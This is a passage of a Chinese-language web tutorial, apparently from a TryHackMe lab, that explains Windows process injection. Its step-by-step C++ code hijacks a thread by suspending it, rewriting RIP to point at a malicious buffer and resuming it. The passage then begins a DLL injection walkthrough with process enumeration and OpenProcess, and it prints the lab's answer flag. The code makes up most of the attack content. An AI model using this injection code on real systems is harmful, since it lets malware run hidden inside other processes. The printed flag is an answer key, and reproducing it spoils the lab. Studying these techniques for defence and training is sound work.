fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>一旦完成初始步骤并将恶意代码写入内存，我们可以进入第 4 步。在第 4 步中，我们需要通过确定线程 ID 来开始劫持目标进程的线程。为此，我们需要使用三组 Windows API 调用：<code>CreateToolhelp32Snapshot()</code>、<code>Thread32First()</code> 和 <code>Thread32Next()</code>。这些 API 调用将共同循环遍历进程的快照，并扩展能力以枚举进程信息。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THREADENTRY32 threadEntry</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hSnapshot </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateToolhelp32Snapshot</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取指定进程的快照</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	TH32CS_SNAPTHREAD</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 包括系统上所有进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 表示当前进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Thread32First</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取快照中的第一个线程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hSnapshot</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 快照的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">threadEntry </span><span class="token comment" style="color:#999988;font-style:italic">// 指向 THREADENTRY32 结构的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Thread32Next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取快照中的下一个线程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	snapshot</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 快照的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">threadEntry </span><span class="token comment" style="color:#999988;font-style:italic">// 指向 THREADENTRY32 结构的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第 5 步，我们已收集所有必要的信息，并可以打开目标线程。为此，我们将使用 <code>OpenThread</code> 并传递 <code>THREADENTRY32</code> 结构指针。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadEntry</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">th32OwnerProcessID </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> processID</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 验证父进程 ID 匹配</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			HANDLE hThread </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">OpenThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">				THREAD_ALL_ACCESS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 请求所有可能的访问权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">				FALSE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 子线程不继承父线程句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">				threadEntry</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">th32ThreadID </span><span class="token comment" style="color:#999988;font-style:italic">// 从 THREADENTRY32 结构指针读取线程 ID</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			</span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第 6 步，我们必须挂起打开的目标线程。为此，我们可以使用 <code>SuspendThread</code>。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">SuspendThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第 7 步，我们需要获取线程上下文，以便在后续的 API 调用中使用。可以使用 <code>GetThreadContext</code> 来存储上下文指针。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CONTEXT context</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">GetThreadContext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hThread</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 线程的句柄 </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">context </span><span class="token comment" style="color:#999988;font-style:italic">// 存储上下文结构的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第 8 步，我们需要将 RIP（指令指针寄存器）覆盖为指向我们的恶意内存区域。如果你不熟悉 CPU 寄存器，RIP 是 x64 寄存器，决定下一条代码指令的位置；简而言之，它控制应用程序在内存中的执行流程。要覆盖该寄存器，我们可以更新线程上下文中的 RIP。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Rip </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">DWORD_PTR</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">remoteBuffer</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 将 RIP 指向我们的恶意缓冲区分配</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第 9 步，上下文已更新，需要将其更新到当前线程上下文中。这可以通过 <code>SetThreadContext</code> 和上下文指针轻松完成。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">SetThreadContext</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hThread</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 线程的句柄 </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">context </span><span class="token comment" style="color:#999988;font-style:italic">// 上下文结构的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在最后一步，我们可以将目标线程从挂起状态恢复。为此，我们可以使用 <code>ResumeThread</code>。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">ResumeThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	hThread </span><span class="token comment" style="color:#999988;font-style:italic">// 线程的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以将这些步骤组合起来，通过线程劫持创建一个进程注入器。使用提供的 C++ 注入器并实验线程劫持。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>识别一个以 THM-Attacker 身份运行的进程的 PID 作为目标。将 PID 作为参数提供给位于桌面上 Injectors 目录中的 thread-injector.exe 执行。</p><p>在劫持线程后获得的标志是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{w34p0n1z3d_53w1n6}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="abusing-dlls---滥用-dlls">Abusing DLLs - 滥用 DLLs<a href="#abusing-dlls---滥用-dlls" class="hash-link" aria-label="Direct link to Abusing DLLs - 滥用 DLLs" title="Direct link to Abusing DLLs - 滥用 DLLs">​</a></h2>
<p>在高级层面，DLL 注入可以分为六个步骤：</p>
<ol>
<li>定位目标进程进行注入。</li>
<li>打开目标进程。</li>
<li>为恶意 DLL 分配内存区域。</li>
<li>将恶意 DLL 写入分配的内存。</li>
<li>加载并执行恶意 DLL。</li>
</ol>
<p>接下来，我们将拆解一个基本的 DLL 注入程序，识别每个步骤，并进一步解释。</p>
<p>在 DLL 注入的第一个步骤中，我们必须定位目标线程。可以通过一组三个 Windows API 调用来从进程中定位线程：<code>CreateToolhelp32Snapshot()</code>、<code>Process32First()</code> 和 <code>Process32Next()</code>。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DWORD </span><span class="token function" style="color:#d73a49">getProcessId</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">processName</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HANDLE hSnapshot </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateToolhelp32Snapshot</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 截取指定进程的快照</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			TH32CS_SNAPPROCESS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 包括系统中所有的进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">			</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 表示当前进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">hSnapshot</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        PROCESSENTRY32 entry</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 结构体指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        entry</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dwSize </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">sizeof</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PROCESSENTRY32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取结构体的字节大小</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Process32First</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取快照中的第一个进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">					hSnapshot</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 快照句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">					</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">entry </span><span class="token comment" style="color:#999988;font-style:italic">// PROCESSENTRY32 结构体指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">				</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token function" style="color:#d73a49">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 比较字符串判断进程名是否匹配</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">									entry</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">szExeFile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 当前进程的可执行文件名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">									processName </span><span class="token comment" style="color:#999988;font-style:italic">// 提供的进程名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">								</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> entry</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">th32ProcessID</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 返回匹配进程的进程 ID</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Process32Next</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 获取快照中的下一个进程</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">							hSnapshot</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 快照句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">							</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">entry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">						</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 指向 PROCESSENTRY32 结构的指针</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD processId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">getProcessId</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">processName</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 存储枚举的进程 ID</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在第二步中，枚举出 PID 后，我们需要打开该进程。这可以通过多种 Windows API 调用来完成，如 <code>GetModuleHandle</code>、<code>GetProcAddress</code> 或 <code>OpenProcess</code>。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HANDLE hProcess </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">OpenProcess</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	PROCESS_ALL_ACCESS</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 请求所有可能的访问权限</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	FALSE</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// 子进程不会继承父进程的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	processId </span><span class="token comment" style="color:#999988;font-style:italic">// 存储的进程 ID</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" 